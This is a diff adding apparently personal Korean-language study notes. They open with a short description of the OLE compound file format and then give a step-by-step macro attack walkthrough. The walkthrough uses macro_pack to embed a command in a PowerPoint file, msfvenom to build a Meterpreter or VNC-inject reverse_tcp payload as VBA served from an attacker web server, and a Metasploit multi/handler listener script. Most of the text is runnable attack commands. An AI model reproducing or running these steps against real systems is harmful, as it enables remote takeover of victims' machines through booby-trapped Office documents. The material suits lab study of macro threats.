@@ -1,0 +1,78 @@
+﻿OLE 포맷 
+
+https://bonggang.tistory.com/136
+
+OLE 파일(CFB, Compound File Binary) 포맷은 일반적으로 복합 문서를 지칭하며 MS의 문서 포맷으로 사용된다.
+
+폴더 역할의 스토리지(Storage)와 파일 역할의 스트림(Stream)으로 구성되어 있으며 512byte의 섹터 단위로 저장되어있다.
+
+
+
+1. MACRO 를 이용한  공격 
+
+===== macro pack 을 이용한 테스트 ======
+echo "calc.exe" | macro_pack.exe -t CMD -o -G calc.pptm
+
+
+calc.exe 대신 사용하고 싶은 cmd 명령어 넣어보기
+
+
+
+=====   metasploit framework 기능을 활용한 MACRO 공격 ====
+
+# msfconsole
+
+msf > search vncinject
+
+
+Matching Modules
+================
+
+Name Disclosure Date Rank Description
+---- --------------- ---- -----------
+......
+
+payload/windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager
+......
+
+payload/windows/x64/vncinject/reverse_tcp normal Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
+......
+
+msf >
+
+2. payload  만들기  [주의] LHOST 는 KALI 시스템의 주소입니다.
+[변경 전]
+# msfvenom -p windows/x64/vncinject/reverse_tcp LHOST=192.168.100.147 LPORT=4444 VNCHOST=127.0.0.1 EXITFUNC=process VNCPORT=5500 V -f vba > /var/www/html/msf.vba
+                       windows/meterpreter/reverse_tcp
+[변경 후]
+# msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.100.147 -f vba > /var/www/html/msf.vba
+
+# systemctl restart apache2
+http://192.168.100.147/msf.vba
+
+3. 리스너
+# msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/x64/vncinject/reverse_tcp; set LHOST 192.168.100.147; set LPORT 4444; set VNCPORT 5500 ; set VERBOSE true; run"
+                                                                              windows/meterpreter/reverse_tcp
+또는
+
+
+[변경 전]
+root@kali:~# cat localhandler.rc
+use exploit/multi/handler
+set payload windows/x64/vncinject/reverse_tcp      <---   windows/meterpreter/reverse_tcp
+set lhost 192.168.100.147
+set lport 4444
+set VNCPORT 5500
+set VERBOSE true
+set exitonsession false
+exploit -j
+
+[변경 후]
+root@kali:~# cat localhandler.rc
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp   
+set lhost 192.168.100.147
+exploit -j
+
+
+ root@kali:~# msfconsole -r localhandler.rc
